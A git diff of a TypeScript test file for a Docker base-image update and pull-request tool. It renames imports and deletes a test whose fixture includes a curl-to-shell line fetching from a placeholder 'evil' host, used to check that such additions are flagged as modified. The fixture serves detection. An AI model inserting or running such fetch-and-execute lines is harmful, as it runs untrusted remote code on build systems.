@@ -23,10 +23,9 @@ after(() => rmSync(dir, { recursive: true, force: true }))
 
 const { parseFroms, finalBase, rewriteFroms } = await import('../src/compose/dockerfile.ts')
 const { scanRepo } = await import('../src/compose/scan.ts')
-const { classifyPatch } = await import('../src/gitops/poll.ts')
 const { getDb } = await import('../src/db.ts')
-const { buildBranch, prTitle } = await import('../src/gitops/pr.ts')
-const { prBody } = await import('../src/gitops/body.ts')
+const { buildBranch, prTitle } = await import('../src/gitops/ship.ts')
+const { baseImageSection } = await import('../src/gitops/body.ts')
 const { PolicySchema } = await import('../src/config.ts')
 const { buildableServices } = await import('../src/deploy/run.ts')
 const { performRollback } = await import('../src/deploy/rollback.ts')
@@ -156,17 +155,7 @@ test('a watched build is watched through its base; an unwatched one is left alon
   assert.deepEqual(by.unwatched!.labelProblems, [], 'nothing is said about a build nobody asked to watch')
 })
 
-// ------------------------------------------------------------------ the pull request
-
-test('a FROM-only Dockerfile diff is as clean as an image line; anything else in it is not', () => {
-  const f = (filename: string, patch: string) => ({ filename, patch })
-  const from = `@@ -1 +1 @@\n-FROM node:22-slim@${OLD}\n+FROM node:22-slim@${NEW}`
-  assert.equal(classifyPatch([f('obsidian/Dockerfile', from)], false), 'tag-only')
-  assert.equal(classifyPatch([f('minuspod/openvino/Dockerfile', from)], false), 'tag-only')
-  assert.equal(classifyPatch([f('app/Build.Dockerfile', from)], false), 'tag-only')
-  assert.equal(classifyPatch([f('obsidian/Dockerfile', `${from}\n+RUN curl evil | sh`)], false), 'modified')
-  assert.equal(classifyPatch([f('obsidian/entrypoint.sh', from)], false), 'modified')
-})
+// ------------------------------------------------------------------ the change
 
 const DOCKERFILE = `# the sync client\nFROM node:22-slim@${OLD} AS build\nRUN npm ci\nFROM node:22-slim@${OLD}\nCOPY --from=build /app /app\n`
 const COMPOSE = `services:\n  obsidian-sync:\n    build: .\n    labels:\n      shipshape.watch: "true"\n`
@@ -224,7 +213,7 @@ test('a digest move edits the Dockerfile and commits nothing else', async () => 
   const title = prTitle(g, r.forks, r.bases)
   assert.equal(title, `chore(deps): obsidian: rebuild obsidian-sync on node 22-slim@${OLD.slice(7, 19)} -> 22-slim@${NEW.slice(7, 19)}`)
   assert.equal(sh(repo, ['log', '-1', '--format=%s']), title)
-  const body = prBody(g, policy, new Map([[7, 'nodejs/node']]), r.forks, r.bases)
+  const body = baseImageSection(g, r.bases)
   assert.match(body, /### Base image/)
   assert.match(body, /built here from `obsidian\/Dockerfile`/)
   assert.match(body, /the 2 stages built/)
